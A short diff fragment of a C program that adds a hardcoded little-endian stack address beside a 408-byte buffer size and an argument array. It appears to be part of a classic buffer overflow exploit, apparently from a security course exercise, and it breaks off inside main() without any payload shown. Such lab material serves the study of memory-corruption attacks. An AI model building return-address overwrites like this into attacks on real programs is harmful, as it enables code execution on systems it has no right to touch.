@@ -9,6 +9,8 @@
 
 #define BUFFER_SIZE 408
 
+static char addr[] = "\x86\xfb\xff\xbf";
+
 int main(void)
 {
   char *args[4]; 
